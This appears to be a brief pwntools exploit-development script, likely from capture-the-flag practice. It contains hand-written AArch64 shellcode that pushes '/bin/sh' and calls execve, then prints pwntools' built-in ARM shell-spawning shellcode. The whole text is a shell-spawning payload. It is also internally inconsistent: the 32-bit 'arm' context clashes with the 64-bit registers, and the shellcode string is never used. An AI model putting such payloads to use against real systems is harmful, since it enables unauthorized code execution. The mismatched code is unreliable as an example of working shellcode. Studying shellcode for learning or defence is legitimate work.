from pwn import *

context.arch = 'arm'

shellcode = """
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]!
mov  x1, xzr
mov  x2, xzr
add  x0, sp, x1
mov  x8, #221
svc  #0x1337
"""
print(shellcraft.arm.linux.sh())